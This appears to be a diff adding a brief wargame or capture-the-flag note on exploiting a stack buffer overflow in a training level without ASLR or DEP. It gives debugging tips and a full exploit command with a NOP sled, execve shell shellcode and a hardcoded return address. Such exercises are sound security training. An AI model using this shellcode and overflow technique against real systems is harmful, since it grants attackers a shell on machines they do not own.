@@ -1,0 +1,7 @@
+This was a simple buffer overflow to shellcode exploit with no ASLR and no DEP. However I still ran into the problem where GDB's addresses were slightly off, causing it to work under GDB but not when actually running. Found a pretty good solution online. Just remember to unset env LINES and unset env COLUMNS and run the exploit with his script
+
+http://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966
+
+Don't forget to unset env LINES/COLUMNS!
+
+Command: ./invoke.sh /levels/level05 `python -c 'print "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*109+"\x08\xfe\xff\xbf\x10\xfd\xff\xbf"'`
